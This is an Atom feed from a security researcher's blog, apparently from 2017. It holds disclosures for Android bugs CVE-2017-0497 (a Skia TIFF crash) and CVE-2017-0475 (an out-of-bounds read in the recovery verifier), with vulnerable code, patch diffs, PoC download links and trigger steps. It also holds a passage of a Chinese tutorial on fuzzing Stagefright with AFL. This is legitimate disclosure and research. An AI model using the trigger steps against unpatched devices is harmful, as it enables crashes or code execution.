<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ele7enxxh&#39;s Blog</title>
  <subtitle>For you, a thousand times over</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://ele7enxxh.com/"/>
  <updated>2017-03-26T22:35:02.620Z</updated>
  <id>http://ele7enxxh.com/</id>
  
  <author>
    <name>ele7enxxh</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Details-Of-Denial-Of-Service-Vulnerability-In-Mediaserver-CVE-2017-0497</title>
    <link href="http://ele7enxxh.com/Details-Of-Denial-Of-Service-Vulnerability-In-Mediaserver-CVE-2017-0497.html"/>
    <id>http://ele7enxxh.com/Details-Of-Denial-Of-Service-Vulnerability-In-Mediaserver-CVE-2017-0497.html</id>
    <published>2017-03-27T14:18:00.000Z</published>
    <updated>2017-03-26T22:35:02.620Z</updated>
    
    <content type="html"><![CDATA[<p>An SIGFPE is raised in function onGetPixels of SkRawCodec.cpp when the mediaserver try to parse a craft TIFF file with zero height dimensions.</p>
<ul>
<li>CVE ID: CVE-2017-0497;</li>
<li>Android ID: A-33300701;</li>
<li>Severity: Moderate;</li>
<li>Updated Google devices: All;</li>
<li>Updated AOSP versions: 7.0, 7.1.1.</li>
</ul>
<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p><a href="http://androidxref.com/7.0.0_r1/xref/external/skia/src/codec/SkRawCodec.cpp#689" target="_blank" rel="external">http://androidxref.com/7.0.0_r1/xref/external/skia/src/codec/SkRawCodec.cpp#689</a></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (imageSize.h / width &gt; maxDiffRatio || imageSize.h &lt; width ||</div><div class="line">  imageSize.v / height &gt; maxDiffRatio || imageSize.v &lt; height) &#123;</div><div class="line">  <span class="keyword">return</span> SkCodec::kInvalidScale;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>The width and height could be zero without a check for size information of the TIFF file.</p>
<h2 id="Attack-vector"><a href="#Attack-vector" class="headerlink" title="Attack vector"></a>Attack vector</h2><p>You can click <a href="https://github.com/ele7enxxh/poc-exp/raw/master/CVE-2017-0497/CVE-2017-0497.zip" target="_blank" rel="external">here</a> to get the poc.</p>
<p>The easily way to trigger this vulnerability is as follows.</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">BitmapFactory.decodeFile(<span class="string">"CVE-2017-0497.tiff"</span>);</div></pre></td></tr></table></figure>
<h2 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h2><p>Verify the size information.</p>
<p><a href="https://android.googlesource.com/platform/external/skia/+/8888cbf8e74671d44e9ff92ec3847cd647b8cdfb%5E%21/#F1" target="_blank" rel="external">https://android.googlesource.com/platform/external/skia/+/8888cbf8e74671d44e9ff92ec3847cd647b8cdfb%5E%21/#F1</a></p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">diff --git a/src/codec/SkRawCodec.cpp b/src/codec/SkRawCodec.cpp</div><div class="line">index ab2c55d..eea551e 100644</div><div class="line"><span class="comment">--- a/src/codec/SkRawCodec.cpp</span></div><div class="line"><span class="comment">+++ b/src/codec/SkRawCodec.cpp</span></div><div class="line"><span class="meta">@@ -542,13 +542,15 @@</span></div><div class="line">             (header[0] == 0x4D &amp;&amp; header[1] == 0x4D &amp;&amp; header[2] == 0x00 &amp;&amp; header[3] == 0x2A);</div><div class="line">     &#125;</div><div class="line"> </div><div class="line"><span class="deletion">-    void init(const int width, const int height, const dng_point&amp; cfaPatternSize) &#123;</span></div><div class="line"><span class="addition">+    bool init(const int width, const int height, const dng_point&amp; cfaPatternSize) &#123;</span></div><div class="line">         fImageInfo = SkImageInfo::Make(width, height, kN32_SkColorType, kOpaque_SkAlphaType);</div><div class="line"> </div><div class="line">         // The DNG SDK scales only during demosaicing, so scaling is only possible when</div><div class="line">         // a mosaic info is available.</div><div class="line">         fIsScalable = cfaPatternSize.v != 0 &amp;&amp; cfaPatternSize.h != 0;</div><div class="line">         fIsXtransImage = fIsScalable ? (cfaPatternSize.v == 6 &amp;&amp; cfaPatternSize.h == 6) : false;</div><div class="line"><span class="addition">+</span></div><div class="line"><span class="addition">+        return width &gt; 0 &amp;&amp; height &gt; 0;</span></div><div class="line">     &#125;</div><div class="line"> </div><div class="line">     bool initFromPiex() &#123;</div><div class="line"><span class="meta">@@ -558,15 +560,9 @@</span></div><div class="line">         if (::piex::IsRaw(&amp;piexStream)</div><div class="line">             &amp;&amp; ::piex::GetPreviewImageData(&amp;piexStream, &amp;imageData) == ::piex::Error::kOk)</div><div class="line">         &#123;</div><div class="line"><span class="deletion">-            // Verify the size information, as it is only optional information for PIEX.</span></div><div class="line"><span class="deletion">-            if (imageData.full_width == 0 || imageData.full_height == 0) &#123;</span></div><div class="line"><span class="deletion">-                return false;</span></div><div class="line"><span class="deletion">-            &#125;</span></div><div class="line"><span class="deletion">-</span></div><div class="line">             dng_point cfaPatternSize(imageData.cfa_pattern_dim[1], imageData.cfa_pattern_dim[0]);</div><div class="line"><span class="deletion">-            this-&gt;init(static_cast&lt;int&gt;(imageData.full_width),</span></div><div class="line"><span class="deletion">-                       static_cast&lt;int&gt;(imageData.full_height), cfaPatternSize);</span></div><div class="line"><span class="deletion">-            return true;</span></div><div class="line"><span class="addition">+            return this-&gt;init(static_cast&lt;int&gt;(imageData.full_width),</span></div><div class="line"><span class="addition">+                              static_cast&lt;int&gt;(imageData.full_height), cfaPatternSize);</span></div><div class="line">         &#125;</div><div class="line">         return false;</div><div class="line">     &#125;</div><div class="line"><span class="meta">@@ -594,10 +590,9 @@</span></div><div class="line">             if (fNegative-&gt;GetMosaicInfo() != nullptr) &#123;</div><div class="line">                 cfaPatternSize = fNegative-&gt;GetMosaicInfo()-&gt;fCFAPatternSize;</div><div class="line">             &#125;</div><div class="line"><span class="deletion">-            this-&gt;init(static_cast&lt;int&gt;(fNegative-&gt;DefaultCropSizeH().As_real64()),</span></div><div class="line"><span class="deletion">-                       static_cast&lt;int&gt;(fNegative-&gt;DefaultCropSizeV().As_real64()),</span></div><div class="line"><span class="deletion">-                       cfaPatternSize);</span></div><div class="line"><span class="deletion">-            return true;</span></div><div class="line"><span class="addition">+            return this-&gt;init(static_cast&lt;int&gt;(fNegative-&gt;DefaultCropSizeH().As_real64()),</span></div><div class="line"><span class="addition">+                              static_cast&lt;int&gt;(fNegative-&gt;DefaultCropSizeV().As_real64()),</span></div><div class="line"><span class="addition">+                              cfaPatternSize);</span></div><div class="line">         &#125; catch (...) &#123;</div><div class="line">             return false;</div><div class="line">         &#125;</div></pre></td></tr></table></figure>
<h2 id="Acknowledgement"><a href="#Acknowledgement" class="headerlink" title="Acknowledgement"></a>Acknowledgement</h2><p>This vulnerability was credited to <a href="https://weibo.com/ele7enxxh" target="_blank" rel="external">Zinuo Han</a> from Chengdu Security Response Center of Qihoo 360 Technology Co. Ltd.</p>
<h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><p>2016-12-02: ele7enxxh reported the vulnerability to Google;<br>2017-01-24: Google rated it as a Moderate vulnerability;<br>2017-01-31: Google assigned CVE-2017-0497 for this vulnerability;<br>2017-03-07: Google released the patch and disclosed the details of CVE-2017-0497 on <a href="https://source.android.com/security/bulletin/2017-03-01.html" target="_blank" rel="external">Android Security Bulletin-March 2017</a>.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;An SIGFPE is raised in function onGetPixels of SkRawCodec.cpp when the mediaserver try to parse a craft TIFF file with zero height dimens
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Details-Of-Elevation-Of-Privilege-Vulnerability-In-Recovery-Verifier-CVE-2017-0475</title>
    <link href="http://ele7enxxh.com/Details-Of-Elevation-Of-Privilege-Vulnerability-In-Recovery-Verifier-CVE-2017-0475.html"/>
    <id>http://ele7enxxh.com/Details-Of-Elevation-Of-Privilege-Vulnerability-In-Recovery-Verifier-CVE-2017-0475.html</id>
    <published>2017-03-23T06:29:00.000Z</published>
    <updated>2017-03-26T22:11:58.436Z</updated>
    
    <content type="html"><![CDATA[<p>An OOB(out-of-bounds read) issue was found in function verify_file of verifier.cpp, allows attackers to execute arbitrary code in recovery verifier.</p>
<ul>
<li>CVE ID: CVE-2017-0475;</li>
<li>Android ID: A-31914369;</li>
<li>Severity: critical;</li>
<li>Updated Google devices: All;</li>
<li>Updated AOSP versions: 4.4.4, 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1.</li>
</ul>
<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p><a href="https://android.googlesource.com/platform/bootable/recovery/+/37d7d67ca216972cba9259aa5866220d6abfaf14/verifier.cpp#145" target="_blank" rel="external">https://android.googlesource.com/platform/bootable/recovery/+/37d7d67ca216972cba9259aa5866220d6abfaf14/verifier.cpp#145</a></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">size_t</span> signature_start = footer[<span class="number">0</span>] + (footer[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>);</div></pre></td></tr></table></figure>
<p>There is a missing boundary check where <strong>signature_start</strong> should be within the EOCD comment field.</p>
<p><a href="https://android.googlesource.com/platform/bootable/recovery/+/37d7d67ca216972cba9259aa5866220d6abfaf14/verifier.cpp#234" target="_blank" rel="external">https://android.googlesource.com/platform/bootable/recovery/+/37d7d67ca216972cba9259aa5866220d6abfaf14/verifier.cpp#234</a></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">uint8_t</span>* signature = eocd + eocd_size - signature_start;</div><div class="line"><span class="keyword">size_t</span> signature_size = signature_start - FOOTER_SIZE;</div><div class="line">LOGI(<span class="string">"signature (offset: 0x%zx, length: %zu): %s\n"</span>,</div><div class="line">        length - signature_start, signature_size,</div><div class="line">        print_hex(signature, signature_size).c_str());</div><div class="line"><span class="keyword">if</span> (!read_pkcs7(signature, signature_size, &amp;sig_der, &amp;sig_der_length)) &#123;</div><div class="line">    LOGE(<span class="string">"Could not find signature DER block\n"</span>);</div><div class="line">    <span class="keyword">return</span> VERIFY_FAILURE;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>pkcs7_der</strong> will point to a position beyound the bounds of the valid ZIP buffer due to the invaild ‘signature_start’, which may be exploitable.</p>
<h2 id="Attack-vector"><a href="#Attack-vector" class="headerlink" title="Attack vector"></a>Attack vector</h2><p>You can click <a href="https://github.com/ele7enxxh/poc-exp/raw/master/CVE-2017-0475/CVE-2017-0475.zip" target="_blank" rel="external">here</a> to get the Poc.</p>
<p>The easily way to trigger this vulnerability is as follows.</p>
<ol>
<li>Reboot your Android device to recovery mode;</li>
<li>Select ‘Apply update from ADB’;</li>
<li>Run <code>adb sideload CVE-2017-0475.zip</code>.</li>
</ol>
<h2 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h2><p>Add a boundary check for <strong>signature_start</strong></p>
<p><a href="https://android.googlesource.com/platform/bootable/recovery/+/2c6c23f651abb3d215134dfba463eb72a5e9f8eb%5E%21/#F0" target="_blank" rel="external">https://android.googlesource.com/platform/bootable/recovery/+/2c6c23f651abb3d215134dfba463eb72a5e9f8eb%5E%21/#F0</a></p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">diff --git a/verifier.cpp b/verifier.cpp</div><div class="line">index 16cc7cf..2d1b0e7 100644</div><div class="line"><span class="comment">--- a/verifier.cpp</span></div><div class="line"><span class="comment">+++ b/verifier.cpp</span></div><div class="line"><span class="meta">@@ -146,6 +146,12 @@</span></div><div class="line">     LOGI("comment is %zu bytes; signature %zu bytes from end\n",</div><div class="line">          comment_size, signature_start);</div><div class="line"> </div><div class="line"><span class="addition">+    if (signature_start &gt; comment_size) &#123;</span></div><div class="line"><span class="addition">+        LOGE("signature start: %zu is larger than comment size: %zu\n", signature_start,</span></div><div class="line"><span class="addition">+             comment_size);</span></div><div class="line"><span class="addition">+        return VERIFY_FAILURE;</span></div><div class="line"><span class="addition">+    &#125;</span></div><div class="line"><span class="addition">+</span></div><div class="line">     if (signature_start &lt;= FOOTER_SIZE) &#123;</div><div class="line">         LOGE("Signature start is in the footer");</div><div class="line">         return VERIFY_FAILURE;</div></pre></td></tr></table></figure>
<h2 id="Acknowledgement"><a href="#Acknowledgement" class="headerlink" title="Acknowledgement"></a>Acknowledgement</h2><p>This vulnerability was credited to <a href="https://weibo.com/ele7enxxh" target="_blank" rel="external">Zinuo Han</a> from Chengdu Security Response Center of Qihoo 360 Technology Co. Ltd.</p>
<h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><p>2016-10-02: ele7enxxh reported the vulnerability to Google;<br>2016-11-17: Google rated it as a critical vulnerability;<br>2017-01-31: Google assigned CVE-2017-0475 for this vulnerability;<br>2017-03-07: Google released the patch and disclosed the details of CVE-2017-0475 on <a href="https://source.android.com/security/bulletin/2017-03-01.html" target="_blank" rel="external">Android Security Bulletin-March 2017</a>.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;An OOB(out-of-bounds read) issue was found in function verify_file of verifier.cpp, allows attackers to execute arbitrary code in recover
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>在Linux上使用AFL对Stagefright进行模糊测试</title>
    <link href="http://ele7enxxh.com/Use-AFL-For-Stagefright-Fuzzing-On-Linux.html"/>
    <id>http://ele7enxxh.com/Use-AFL-For-Stagefright-Fuzzing-On-Linux.html</id>
    <published>2017-03-12T13:49:00.000Z</published>
    <updated>2017-03-12T14:25:57.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>模糊测试是一种自动向程序传递输入数据并监控其输出的自动化测试技术。通过这种技术，安全人员可以测试程序的可靠性以及识别潜在的安全漏洞。</p>
<p>我们（<strong>360成都安全响应中心</strong>）将对<a href="https://quandarypeak.com/2013/08/androids-stagefright-media-player-architecture/" target="_blank" rel="external">Stagefright Media Framework</a>进行模糊测试。它是Android系统上用于解析多媒体文件的逻辑算法库，其中包含了大量的安全漏洞，攻击者通过构造特殊的多媒体文件导致拒绝服务或特权升级甚至远程执行代码。</p>
<p>我们将要使用的模糊测试工具为Michał Zalewski开发的一款最为流行的基于代码覆盖率的开源测试工具：<a href="http://lcamtuf.coredump.cx/afl/" target="_blank" rel="external">AFL(American Fuzzy Lop)</a>。 借助于其高效的策略，AFL已经在真实产品中发现了大量的漏洞。</p>
<p>在本文中，我们将指导你如何在Linux上使用AFL对stagefright进行模糊测试，从而更高效的复现已知漏洞或发掘新漏洞。 另外，本文不仅适用于stagefright，其中的一些经验同样适用于其它由C/C++编写的Android本地程序。</p>
<h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><p>在本节中，我们将首先向你介绍本文接下来使用的环境要求以及软件版本。为了避免出现其他未遇见的错误，我们建议你和我们保持完全一致。</p>
<ul>
<li>操作系统：Ubuntu 16.10 64bit， <strong>不建议使用32位系统</strong>；</li>
<li>AFL版本：2.39b，最新的总是更好的；</li>
<li>AOSP版本：7.1.1_r25，如果你使用的是其他版本，你可能无法直接使用补丁文件；</li>
<li>llvm和clang版本：3.8。</li>
</ul>
<p>我们假设你已经完成了下载并且编译AOSP的工作。另外，如果你想要使用ASAN，我们建议你编译AOSP为x86版本。</p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>官方AFL只支持在Linux上进行模糊测试，而stagefright是在Android多媒体框架下工作的，因此我们无法直接使用AFL对stagefright进行模糊测试。为了解决这个问题，我们提出了下面两种方案。</p>
<ul>
<li><strong>方案A</strong>：将AFL移植到Android上，从而在Android模拟器或者真实的Android设备上进行模糊测试；</li>
<li><strong>方案B</strong>：将stagefright移植到Linux上，从而直接使用官方AFL对其进行模糊测试。</li>
</ul>
<p>其中，我们已经实现了方案A–<strong>android-afl</strong>，并且公布了源代码，你可以从<a href="https://github.com/ele7enxxh/android-afl" target="_blank" rel="external">仓库</a>得到更多信息。</p>
<p>方案A的主要流程图如下图所示。</p>
<p><img src="/images/Use-AFL-For-Stagefright-Fuzzing-On-Linux_1.png" alt="1"></p>
<p>方案B的主要流程图如下图所示。</p>
<p><img src="/images/Use-AFL-For-Stagefright-Fuzzing-On-Linux_2.png" alt="2"></p>
<p>显而易见，相比于方案A，方案B更加简洁，其效率也更好（通常来说，PC的性能远高于任何Android手机或者Android模拟器）；另一方面，由于stagefright本身的复杂性，其实现也更加困难。</p>
<p>在后续的文章中，我们将一步一步向你介绍如何实现方案B。通过它，我们已经发现了两个漏洞。</p>
<ul>
<li><a href="https://source.android.com/security/bulletin/2016-12-01.html" target="_blank" rel="external">CVE-2016-6764</a>：mediaserver的拒绝服务漏洞；</li>
<li><a href="https://source.android.com/security/bulletin/2016-12-01.html" target="_blank" rel="external">CVE-2016-6766</a>：mediaserver的拒绝服务漏洞。</li>
</ul>
<h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><h3 id="移植stagefright到Linux"><a href="#移植stagefright到Linux" class="headerlink" title="移植stagefright到Linux"></a>移植stagefright到Linux</h3><p>显而易见，我们首先要让stagefright在Linux上正常工作。</p>
<h4 id="移植binder和ashmem"><a href="#移植binder和ashmem" class="headerlink" title="移植binder和ashmem"></a>移植binder和ashmem</h4><p>stagefright需要通过ashmem驱动来共享内存，然而默认情况下Linux内核并不包含ashmem驱动。幸运的是，我们可以通过修改Linux内核配置，并重新编译安装新内核，从而激活ashmem驱动。</p>
<blockquote>
<p>我们也许还有更好的解决方案，例如：使用shm代替ashmem或者完全去掉ashmem相关的代码;<br>注意，本文并未使用binder驱动，这里移植binder只是顺便而已。</p>
</blockquote>
<p>使用以下命令下载内核源码。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo apt install linux-source</div></pre></td></tr></table></figure>
<p>转到你要保存内核源码的目录并提取压缩文件。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">cd</span> kernel</div><div class="line">$ tar jxvf /usr/src/linux/linux-source-4.8.0.tar.bz2</div><div class="line">$ <span class="built_in">cd</span> linux-source-4.8.0</div></pre></td></tr></table></figure>
<p>拷贝旧的<strong>.config</strong>文件到源码根目录并开始配置。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ cp -vi /boot/config-`uname -r` .config</div><div class="line">$ make oldconfig</div></pre></td></tr></table></figure>
<p>接着使用下面的命令来激活ashmem驱动。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ make menuconfig</div></pre></td></tr></table></figure>
<p>转到<strong>Device Drivers-&gt;Android</strong>，选中<strong>Andoid Drivers</strong>和<strong>Android Binder IPC Driver</strong>。</p>
<p><img src="/images/Use-AFL-For-Stagefright-Fuzzing-On-Linux_3.png" alt="3"></p>
<p>转到<strong>Device Drivers-&gt;Staging drivers-&gt;Android</strong>，选中<strong>Enable the Anonymous Shared Memory Subsystem</strong>。</p>
<p><img src="/images/Use-AFL-For-Stagefright-Fuzzing-On-Linux_4.png" alt="4"></p>
<p>现在你可以开始编译安装内核了，执行下面的命令。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ make -j16</div><div class="line">$ sudo make modules_install</div><div class="line">$ sudo make install</div></pre></td></tr></table></figure>
<p>你还需要配置udev规则，从而使得任何用户均可访问binder和ashmem。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">echo</span> <span class="_">-e</span> <span class="string">"KERNEL==\"binder\", MODE=\"0666\"\nKERNEL==\"ashmem\", MODE=\"0666\""</span> | sudo tee /etc/udev/rules.d/android.rules</div></pre></td></tr></table></figure>
<p>最后，重启你的电脑以启用新内核。</p>
<h4 id="修改Stagefright源码"><a href="#修改Stagefright源码" class="headerlink" title="修改Stagefright源码"></a>修改Stagefright源码</h4><blockquote>
<p>注意，变量ANDROID_BUILD_TOP为AOSP的根目录，ANDROID_PRODUCT_OUT为AOSP的输出目录。</p>
</blockquote>
<p>在这一节，你需要对stagefright源码（包括libstagefright和 stagefright命令行工具）进行改动，原因主要为以下两点。</p>
<ul>
<li><p><strong>平台性</strong>：stagefright使用了binder驱动进行进程间通信，然而默认情况下Linux内核并不包含binder驱动（实际上，我们可以通过修改Linux内核配置，并重新编译安装新内核，从而激活binder驱动）；</p>
</li>
<li><p><strong>依赖性</strong>：stagefright命令行工具无法独立的对多媒体文件进行解析，它依赖于其他服务进程（如：servicemanager，mediaserver等）。</p>
</li>
</ul>
<p>我们将不会阐述解决上诉两个问题的具体细节，你可以直接使用我们提供的适用于7.1.1_r25版本的补丁文件。如果你使用的版本和我们不同，你可能需要参照补丁文件，手动修改代码。</p>
<p>点击<a href="/downloads/stagefright.diff">这里</a>下载补丁文件<strong>stagefright.diff</strong>，转到$ANDROID_BUILD_TOP/aosp/master/frameworks/av目录并应用补丁。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">cd</span> <span class="variable">$ANDROID_BUILD_TOP</span>/frameworks/av</div><div class="line">$ git apply stagefright.diff</div></pre></td></tr></table></figure>
<h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p>编译好x86版本的AOSP后，转到stagefright源码目录，并编译。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">cd</span> <span class="variable">$ANDROID_BUILD_TOP</span>/frameworks/av/cmds/stagefright</div><div class="line">$ mm -j16</div></pre></td></tr></table></figure>
<p>编译结束后，你可以在$ANDROID_PRODUCT_OUT/system/bin目录找到stagefright可执行程序。</p>
<h4 id="配置运行环境"><a href="#配置运行环境" class="headerlink" title="配置运行环境"></a>配置运行环境</h4><p>为了让系统能正确找到加载器以及依赖库的位置，你需要做以下软连接。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sudo ln <span class="_">-s</span> <span class="variable">$ANDROID_PRODUCT_OUT</span>/system /system</div></pre></td></tr></table></figure>
<p>拷贝解码器配置文件到/etc目录。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ sudo cp <span class="variable">$ANDROID_PRODUCT_OUT</span>/system/etc/media_codecs_google_audio.xml /etc</div><div class="line">$ sudo cp <span class="variable">$ANDROID_PRODUCT_OUT</span>/system/etc/media_codecs_google_telephony.xml /etc</div><div class="line">$ sudo cp <span class="variable">$ANDROID_PRODUCT_OUT</span>/system/etc/media_codecs_google_video.xml /etc</div><div class="line">$ sudo cp <span class="variable">$ANDROID_PRODUCT_OUT</span>/system/etc/media_codecs.xml /etc</div></pre></td></tr></table></figure>
<p>另外，如果需要在后续使用ASAN，你还需要做以下软连接。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ ln <span class="_">-s</span> <span class="variable">$ANDROID_PRODUCT_OUT</span>/system/bin/linker <span class="variable">$ANDROID_PRODUCT_OUT</span>/system/bin/linker_asan</div><div class="line">$ ln <span class="_">-s</span> <span class="variable">$ANDROID_PRODUCT_OUT</span>/obj/lib/libclang_rt.asan-i686-android.so <span class="variable">$ANDROID_PRODUCT_OUT</span>/system/lib/libclang_rt.asan-i686-android.so</div></pre></td></tr></table></figure>
<h4 id="测试运行"><a href="#测试运行" class="headerlink" title="测试运行"></a>测试运行</h4><p>现在，你可以尝试在Linux上运行stagefright了。例如，解析一个MP4文件，运行结果如下。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ /system/bin/stagefright Disco.240p.mp4</div><div class="line">thumbnailTime: 0 us (0.00 secs)</div><div class="line">AVC video profile 66 and level 13</div><div class="line">format changed.</div><div class="line">...................$</div><div class="line">avg. 180.73 fps</div><div class="line">avg. time to decode one buffer 5485.86 usecs</div><div class="line">decoded a total of 304 frame(s).</div></pre></td></tr></table></figure>
<p>很好，你已经完成了最为困难也最为重要的工作！</p>
<h3 id="移植AFL"><a href="#移植AFL" class="headerlink" title="移植AFL"></a>移植AFL</h3><p>首先，你需要从官网下载最新的AFL源码并解压。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ wget http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz</div><div class="line">$ tar zxf afl-latest.tgz</div></pre></td></tr></table></figure>
<p>接着，对AFL源码进行修改以修复下面几个错误。</p>
<p><code>error: undefined reference to &#39;__fprintf_chk&#39;</code><br><code>error: undefined reference to &#39;shmat&#39;</code><br><code>error: undefined reference &#39;afl-area_prev&#39;</code></p>
<p>同样，我们直接给出适用于2.39b版本（此时的最新版本）的AFL的补丁文件。如果你使用的版本和我们不同，你可能需要参照补丁文件，手动修改代码。</p>
<p>从<a href="downloads/afl-2.39b.diff">这里</a>下载补丁文件<strong>afl-2.39b.diff</strong>到你的电脑，转到AFL源码根目录并安装补丁。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">cd</span> afl-2.39b</div><div class="line">$ patch -p2 &lt; afl-2.39b.diff</div></pre></td></tr></table></figure>
<p>使用以下命令编译安装AFL。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ make clean all</div><div class="line">$ <span class="built_in">cd</span> llvm_mode</div><div class="line">$ EXTRA_CFLAGS=<span class="string">"-target i686--linux-android -U_FORTIFY_SOURCE"</span> make clean all</div><div class="line">$ <span class="built_in">cd</span> ../</div><div class="line">$ sudo make install</div></pre></td></tr></table></figure>
<h3 id="使用AFL和ASAN进行重编译"><a href="#使用AFL和ASAN进行重编译" class="headerlink" title="使用AFL和ASAN进行重编译"></a>使用AFL和ASAN进行重编译</h3><p>首先，进入你想要进行模糊测试的模块目录。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ <span class="built_in">cd</span> MODULE_PATH</div></pre></td></tr></table></figure>
<p>其次，在其Android.mk文件中添加以下代码。</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">LOCAL_CLANG := true</div><div class="line">export AFL_CC := /usr/bin/clang</div><div class="line">LOCAL_CC := afl-clang-fast</div><div class="line">export AFL_CXX := /usr/bin/clang++</div><div class="line">LOCAL_CXX := afl-clang-fast++</div></pre></td></tr></table></figure>
<blockquote>
<p>注意，由于<strong>unsupported reloc</strong>这个错误，我们不推荐使用afl-gcc/afl-g++。另一方面，根据AFL官方的资料，afl-clang-fast/afl-clang-fast++也是更高效的。</p>
</blockquote>
<p>接着，如果你想使用ASAN，你需要添加下面一行代码</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LOCAL_SANITIZE := address</div></pre></td></tr></table></figure>
